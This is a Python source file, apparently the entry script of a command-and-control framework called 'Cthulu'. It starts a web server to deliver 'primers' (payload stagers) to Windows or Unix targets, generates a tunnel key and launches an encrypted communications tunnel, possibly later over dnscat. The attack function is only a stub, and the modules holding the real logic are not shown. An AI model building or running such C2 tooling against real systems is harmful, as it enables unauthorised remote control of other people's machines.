# @author Stefano Sesia all rights reserved
# Cthulu command and control center
# Requires sudo apt-get install mingw-w64


# Library Imports
from CommunicationTunnelServer import *
from TrivialFunctions import *
from WebServer import *
import constants

# Constants
PORT = 8000

#Functions
def setKey(passphrase):
    constants.key = passphrase

def initializeWebServer():
    output(0,"step","Initializing the server for primers delivery")
    try:
        threadedSimpleServer()
        return  True
    except:
        output(1,"error","There was an error starting the server, quitting...")
        return False


def generatePrimer(platform):
    output(0,"step","Generating the primers")
    if platform == "WIN":
        output(1,"progress","Target is running a Windows OS")
    elif platform == "UNIX":
        output(1, "progress", "Target is running a Unix OS")
    else:
        output(1,"error","OS not yet supported")
        return False

def attack():
    output(2, "warning", "function not yet implemented")

def tunnel():
    output(0,"step","Starting the comms tunnel")
    ## This module can later be changed to include dnscat
    tunnelThread = threading.Thread(target=startTunnel)
    #tunnelThread.daemon = True
    tunnelThread.start()

def main():
    print("0--------------------------------------------------0")
    print("| Greetings adventurer,                             |")
    print("| Thou halt invoked the presence of a Great Old One|")
    print("| Cthulu is listening, use this power wisely!      |")
    print("|                                        ^(;,;)^   |")
    print("0--------------------------------------------------0\n")
    if not initializeWebServer():
        return()

    output(0, "step", "Generating a random key for the communication tunnel")
    setKey(generateRandomKey())
    output(1, "info", "The key is: " + constants.key)

    if not writePrimerHeader(constants.key):
        return()

    tunnel()


main()
